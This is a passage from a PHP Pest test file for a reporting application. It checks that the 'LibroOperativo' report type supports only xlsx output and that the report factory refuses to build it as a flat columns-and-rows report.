        ->and(ReportType::LibroOperativo->supportsFormats())->toBe(['xlsx']);
});

it('refuses to pretend the workbook is a flat report', function (): void {
    // It has no `columns()`/`rows()` shape, and inventing one would be re-interpreting it.
    expect(fn () => app(ReportFactory::class)->make(ReportType::LibroOperativo, [
        'year' => 2026,
    ]))->toThrow(LogicException::class);
});
